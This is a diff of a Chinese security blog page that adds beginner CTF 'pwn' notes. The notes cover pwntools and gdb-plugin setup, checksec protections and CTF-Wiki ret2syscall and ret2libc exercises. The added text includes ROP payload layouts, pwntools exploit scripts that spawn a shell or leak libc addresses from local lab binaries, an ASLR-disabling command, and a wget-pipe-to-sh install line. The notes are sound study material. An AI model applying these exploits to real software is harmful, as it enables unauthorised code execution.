@@ -229,7 +229,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/22/二进制常见/">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/11/14/pwn工具配置与使用，并且自动切换gdb脚本/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="devil0x">
@@ -248,7 +248,180 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/10/22/二进制常见/" itemprop="url">常见函数与汇编指令</a></h1>
+                <a class="post-title-link" href="/2019/11/14/pwn工具配置与使用，并且自动切换gdb脚本/" itemprop="url">pwn工具配置与使用，并且自动切换gdb脚本</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-14T22:35:07+08:00">
+                2019-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="基础的ubuntu配置"><a href="#基础的ubuntu配置" class="headerlink" title="基础的ubuntu配置"></a>基础的ubuntu配置</h3><h4 id="1-换国内源"><a href="#1-换国内源" class="headerlink" title="1.换国内源"></a>1.换国内源</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br></pre></td></tr></table></figure>
+<h4 id="2-换终端"><a href="#2-换终端" class="headerlink" title="2.换终端"></a>2.换终端</h4><p> 教程：<a href="https://www.jianshu.com/p/27c8088dc8f7" target="_blank" rel="noopener">https://www.jianshu.com/p/27c8088dc8f7</a> </p>
+<h4 id="2-趁手的python环境"><a href="#2-趁手的python环境" class="headerlink" title="2.趁手的python环境"></a>2.趁手的python环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.安装python以及pip</span><br><span class="line">2.首先安装交互式Python版本，ipython，</span><br><span class="line">sudo apt install ipython</span><br></pre></td></tr></table></figure>
+<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1.前提：python环境，同时需要装python-dev</span><br><span class="line">均使用apt安装的方式</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br><span class="line">sudo apt install python-dev</span><br><span class="line"></span><br><span class="line">2.pip安装（如果pip安装东西慢，可以换源(清华源)）</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/help/pypi/</span><br><span class="line"></span><br><span class="line">3.pwntools安装</span><br><span class="line">1、安装Capstone</span><br><span class="line">Capstone disassembly/disassembler framework: Core (Arm, Arm64, M68K, Mips, PPC, Sparc, SystemZ, X86, X86_64, XCore) + bindings (Python, Java, Ocaml)</span><br><span class="line"></span><br><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">2、安装pwntools</span><br><span class="line">在终端输入</span><br><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">python setup.py install</span><br><span class="line">如果没报错，并且终端输入python进入其交互模式后，输入import pwn回车后没报错，差不多就好了。</span><br><span class="line">这时候再尝试pwntools的asm功能</span><br><span class="line">&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)</span><br><span class="line">&apos;1\xc0&apos;</span><br><span class="line">如果有正确输出，即说明这个功能是可以用的，到这里就算安装完成。</span><br><span class="line"></span><br><span class="line">3.64位Ubuntu 16.04运行32位程序</span><br><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt install libc6:i386</span><br></pre></td></tr></table></figure>
+<h2 id="checksec详解"><a href="#checksec详解" class="headerlink" title="checksec详解"></a>checksec详解</h2><p>checksec看到的那些参数含义</p>
+<ul>
+<li><p>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</p>
+</li>
+<li><p>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </p>
+</li>
+<li><p>ASLR</p>
+<p>Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code></p>
+<ul>
+<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
+<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
+<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
+</ul>
+<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
+</li>
+<li><p>PIE</p>
+<p>在PIE没有开启的情况下，bss段的地址是固定的，所以，可以把shellcode写入bss段，然后跳转到bss段，然后执行shellcode。</p>
+</li>
+</ul>
+<h2 id="pwntools使用教程"><a href="#pwntools使用教程" class="headerlink" title="pwntools使用教程"></a>pwntools使用教程</h2><p>process 指向本地路径<br>remote(“IP”,port)指向地址还有端口<br>p64打包(可以吧数字转换到小端法)，u64解包(还原回去)<br>context.binary= 设置上下文<br>asm</p>
+<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 <code>c</code>). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
+<ul>
+<li><code>send(payload)</code> 发送payload</li>
+<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li>
+<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
+<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
+<li><code>recvline()</code> 接收一行输出</li>
+<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
+<li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li>
+</ul>
+<h1 id="gdb工具pwndbg与peda与gef配置"><a href="#gdb工具pwndbg与peda与gef配置" class="headerlink" title="gdb工具pwndbg与peda与gef配置"></a>gdb工具pwndbg与peda与gef配置</h1><p>在调试时有时候需要不同功能，在gdb下需要安装两个工具pwndbg和peda，可惜这两个不兼容</p>
+<p>pwndbg在调试堆的数据结构时候很方便</p>
+<p>peda在查找字符串等功能时方便</p>
+<p>安装pwndbg：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
+<p>安装peda：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</span><br></pre></td></tr></table></figure>
+<p>安装gef：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#自动安装</span><br><span class="line">$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line"></span><br><span class="line"># manually</span><br><span class="line">$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py</span><br><span class="line">$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<p>切换gdb的调试工具pwndbg或peda：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinitsource ~/peda/peda.py</span><br></pre></td></tr></table></figure>
+<p>把第二行添加到gdbinit的配置文件中去，把pwndbg的注释掉，即可切换为peda</p>
+<p>选中gef的话，即添加一行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
+<p>并把其他两行注释掉即可</p>
+<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>然后发现，只要把pwndbg放到最上边，然后其他的插件不用注释也都可以用了。</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85td64840j30gg06ywf5.jpg" alt="3.jpg"></p>
+<p>然后虽然显示gef，实际所有功能都有</p>
+<p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85tei4jztj30m906075u.jpg" alt="4.jpg"></p>
+<p>gdb切换工具 <a href="https://blog.csdn.net/aptx4869_li/article/details/81566541" target="_blank" rel="noopener">https://blog.csdn.net/aptx4869_li/article/details/81566541</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://devil0x.github.io/2019/10/22/常见函数与汇编指令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="devil0x">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="devil0x菜鸟">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/22/常见函数与汇编指令/" itemprop="url">常见函数与汇编指令</a></h1>
         
 
         <div class="post-meta">
@@ -308,6 +481,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcat(a1, a2)把a2拼接到a1，a1=a1+a2</span><br></pre></td></tr></table></figure>
 <p>memset(ch,0,sizeof(ch));</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*memset(void *buffer, int c, int count)</span><br><span class="line">- buffer指针或者是数组</span><br><span class="line">- c赋给buffer的数值</span><br><span class="line">- count指的是buffer的长度</span><br></pre></td></tr></table></figure>
+<p>execve()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">execve()用来执行参数filename字符串所代表的文件路径，第二个参数系利用数组指针来传递给执行文件，最后一个参数则为传递给执行文件的新环境变量数组</span><br><span class="line"></span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">　　main()</span><br><span class="line">　　&#123;</span><br><span class="line">　　char * argv[ ]=&#123;“ls”,”-al”,”/etc/passwd”,(char *)0&#125;;</span><br><span class="line">　　char * envp[ ]=&#123;“PATH=/bin”,0&#125;</span><br><span class="line">　　execve(“/bin/ls”,argv,envp);</span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure>
+<p>read()和write()函数详解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write()函数有写文件和输出字符串这2种操作。</span><br></pre></td></tr></table></figure>
 <h2 id="汇编知识"><a href="#汇编知识" class="headerlink" title="汇编知识"></a>汇编知识</h2><p>xor ebx，ebx 相当于给ebx赋0</p>
 
           
@@ -586,7 +763,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/10/21/gdb工具pwndbg与peda与gef配置/" itemprop="url">pwn工具配置与使用</a></h1>
+                <a class="post-title-link" href="/2019/10/21/gdb工具pwndbg与peda与gef配置/" itemprop="url">pwn工具配置与使用，并且自动切换gdb脚本</a></h1>
         
 
         <div class="post-meta">
@@ -676,11 +853,11 @@
 <p>pwndbg在调试堆的数据结构时候很方便</p>
 <p>peda在查找字符串等功能时方便</p>
 <p>安装pwndbg：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
 <p>安装peda：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</span><br></pre></td></tr></table></figure>
 <p>安装gef：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 通过脚本</span><br><span class="line">https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh # manually$ wget -O </span><br><span class="line"></span><br><span class="line">#手动安装</span><br><span class="line">.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py$ echo source .gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#自动安装</span><br><span class="line">$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line"></span><br><span class="line"># manually</span><br><span class="line">$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py</span><br><span class="line">$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
 <p>切换gdb的调试工具pwndbg或peda：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinitsource ~/peda/peda.py</span><br></pre></td></tr></table></figure>
 <p>把第二行添加到gdbinit的配置文件中去，把pwndbg的注释掉，即可切换为peda</p>
@@ -691,6 +868,7 @@
 <p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85td64840j30gg06ywf5.jpg" alt="3.jpg"></p>
 <p>然后虽然显示gef，实际所有功能都有</p>
 <p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g85tei4jztj30m906075u.jpg" alt="4.jpg"></p>
+<p>gdb切换工具 <a href="https://blog.csdn.net/aptx4869_li/article/details/81566541" target="_blank" rel="noopener">https://blog.csdn.net/aptx4869_li/article/details/81566541</a> </p>
 
           
         
@@ -925,7 +1103,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/10/14/PWN入门学习(2)基本的ROP/" itemprop="url">pwn入门学习(2)基本 ROP</a></h1>
+                <a class="post-title-link" href="/2019/10/14/PWN入门学习(2)基本的ROP/" itemprop="url">pwn入门学习(2)pwn-wiki（basic ROP)</a></h1>
         
 
         <div class="post-meta">
@@ -978,9 +1156,9 @@
         
           
             <h1 id="基本-ROP"><a href="#基本-ROP" class="headerlink" title="基本 ROP"></a>基本 ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
-<p>checksec看到的那些参数含义</p>
-<ul>
-<li>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</li>
+<h4 id="0x01-checksec看到的那些参数含义"><a href="#0x01-checksec看到的那些参数含义" class="headerlink" title="0x01.checksec看到的那些参数含义"></a>0x01.checksec看到的那些参数含义</h4><ul>
+<li><p>NX保护：<br>你不能执行我就不执行，栈里面的内容只负责把程序执行流引入到一个需要的汇编代码的位置处，然后调用程序自己的一些代码来实现攻击。你可以调用含有call或者ret代码这样就能一直连接下去。这就是大佬说的ROP链。</p>
+</li>
 <li><p>cannary：<br>函数在执行的时候把一个值放入到栈内的某个位置，我们想要溢出返回地址就要改变这个值，返回的时候系统检查canary值是否改变，如果改变就调用check_failed()函数，打印程序名然后退出。基于这个原理我们可以1、找到canary的值然后填进去。2、可以覆盖掉check_\failed()的调用地址换成system() </p>
 </li>
 <li><p>ASLR</p>
@@ -995,6 +1173,10 @@
 <li><p>PIE</p>
 <p>在PIE没有开启的情况下，bss段的地址是固定的，所以，可以把shellcode写入bss段，然后跳转到bss段，然后执行shellcode。</p>
 </li>
+</ul>
+<h4 id="0x02-指针的含义"><a href="#0x02-指针的含义" class="headerlink" title="0x02.指针的含义"></a>0x02.指针的含义</h4><ul>
+<li>esp是栈顶指针</li>
+<li>ebp是栈底指针 </li>
 </ul>
 <h2 id="CTF-Wiki"><a href="#CTF-Wiki" class="headerlink" title="CTF-Wiki"></a>CTF-Wiki</h2><h3 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="1.ret2text"></a>1.ret2text</h3><p>首先，查看一下程序的保护机制</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2text checksec ret2text</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
@@ -1018,13 +1200,66 @@
 <p><img src="http://ww1.sinaimg.cn/large/0063hjnqly1g87f1gjc4jj308z055glu.jpg" alt="6.jpg"></p>
 <p>因为ida中直接看伪代码可知道，填充的112个字符串中，含有shellcode，并且会把这个112字符串赋值给buf2.跳转之后，会指向buf2中的数据，然后buf2数据是包含shellcode的，然后获得shell权限。</p>
 <p>当时没理解就是因为</p>
-<h3 id="3-ret2syscall"><a href="#3-ret2syscall" class="headerlink" title="3.ret2syscall"></a>3.ret2syscall</h3><p>首先检测程序开启的保护</p>
+<h3 id="3-ret2syscall-int-0x80-系统调用"><a href="#3-ret2syscall-int-0x80-系统调用" class="headerlink" title="3.ret2syscall(int 0x80 系统调用)"></a>3.ret2syscall(int 0x80 系统调用)</h3><p>首先检测程序开启的保护</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall checksec rop</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<h3 id="2-hello"><a href="#2-hello" class="headerlink" title="2.hello"></a>2.hello</h3><p>大概就是占满内存，然后就阻塞了，完事儿跳转到指定的函数地址。</p>
+<p> <a href="https://blog.51cto.com/11797152/2379740?source=dra" target="_blank" rel="noopener">https://blog.51cto.com/11797152/2379740?source=dra</a> </p>
+<p>讲得非常详细</p>
+<p>我们知道溢出偏移量了，现在我们想执行命令，例如execve(“/bin/sh”,null,null)。此时要设计到Linux在调用系统函数时的用法。</p>
+<p>系统函数调用的指令是int 0x80,这是固定指令，他有四个参数：</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>如果你学过任意一门编程语言，可以理解为int 0x80(eax,ebx,ecx,edx)。可能会有这样的疑问：为什么是eax,ebx,ecx,edx要设置为这些值，答案是系统在运行的时候就是固定的要读这四个寄存器，如果不这么写，就不会调用到execve函数。</p>
+<p>接下来我们就要一点点的去拼凑这些内容，我们没法直接在栈里写指令，只能够利用程序中自带的指令去拼凑。</p>
+<p>首先我们将eax设置为0xb，我们是没法直接往栈里写mov eax,0xb的，那么还有另一种方式是pop eax，但是要保证栈顶必须是0xb。</p>
+<p>然后设置ebx,ecx,edx，同样是这样的道理，所以我们可以想象栈中的数据是：</p>
+<p>pop eax；ret</p>
+<p>0xb</p>
+<p>pop ebx;pop ecx;pop edx;ret</p>
+<p>“/bin/sh”的地址</p>
+<p>0</p>
+<p>0</p>
+<p>int 0x80的地址</p>
+<p>这样我们就可以保值eax，ebx，ecx，edx的值了。</p>
+<h3 id="4-ret2libc1"><a href="#4-ret2libc1" class="headerlink" title="4.ret2libc1"></a>4.ret2libc1</h3><p>注重了解一下system传参</p>
+<p>主要就是理解函数的调用过程</p>
+<p>payload = ‘A’*112 + p32(system_addr) + ‘aaaa’ +p32(binsh_addr)</p>
+<p>先是覆盖，然后跳转到system函数的地址，然后跟着aaaa作为system的返回地址，再把/bin/sh的地址作为system的参数放入system</p>
+<p> <a href="https://www.cnblogs.com/pwn2web/p/10349971.html" target="_blank" rel="noopener">https://www.cnblogs.com/pwn2web/p/10349971.html</a> </p>
+<h3 id="5-ret2libc2"><a href="#5-ret2libc2" class="headerlink" title="5.ret2libc2"></a>5.ret2libc2</h3><p>有system函数</p>
+<p>但是没有/bin/sh去执行shell</p>
+<p>构造/bin/sh，</p>
+<ul>
+<li><p>总的思路</p>
+<p>1、用gets的地址覆盖函数返回地址</p>
+<p>2、构造gets的返回地址，（因为gets输入shellcode后，我们就要调用system函数来getshell，所以gets的返回地址是system函数的调用地址，即system_plt）</p>
+<p>3、构造gets需要的参数(就是存放输入字符串的地址，bss段0x804A080)</p>
+<p>4、构造system的参数(就是存放输入字符串的地址，bss段0x804A080)<img src="http://ww1.sinaimg.cn/large/0063hjnqly1g8fltypgtuj30dy0dygm9.jpg" alt="栈结构.jpg"></p>
+</li>
+</ul>
+<p>这种从第一个函数跳到第二函数，跳来跳去的方式就是rop，串起来的方式就是rop链</p>
+<p>由于系统调用原因，调用的时候：1.先是函数地址，2。函数的返回地址，3.函数的传入参数</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">sys_plt  = <span class="number">0x08048490</span> </span><br><span class="line">io=process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'What do you think ?'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">112</span> + p32(gets_plt) + p32(sys_plt) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="6-ret2libc3"><a href="#6-ret2libc3" class="headerlink" title="6.ret2libc3"></a>6.ret2libc3</h3><h5 id="0x01-这里就需要了解一下libc的作用"><a href="#0x01-这里就需要了解一下libc的作用" class="headerlink" title="0x01.这里就需要了解一下libc的作用"></a>0x01.这里就需要了解一下libc的作用</h5><ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序开启了ALSR，但是程序的低3位地址是不会变的，我们可以泄露出某个执行过的函数的低三位地址进而确定libc的版本</li>
+<li>泄露某个函数的地址我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。</li>
+</ul>
+<h5 id="0x02-获取一下libc的版本"><a href="#0x02-获取一下libc的版本" class="headerlink" title="0x02.获取一下libc的版本"></a>0x02.获取一下libc的版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">proc = &apos;./ret2libc3&apos;</span><br><span class="line">elf = ELF(proc)</span><br><span class="line">p = process(proc)</span><br><span class="line">if args.G:</span><br><span class="line">        gdb.attach(p) #运行的时候加上G，进入gdb调试</span><br><span class="line">p.sendlineafter(&apos;!?&apos;, &apos;a&apos; * 112 + p32(elf.plt[&apos;puts&apos;]) + &apos;aaaa&apos; + p32(elf.got[&apos;puts&apos;]))</span><br><span class="line">print &apos;puts_addr =:&apos; +hex(u32(p.recv(4)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
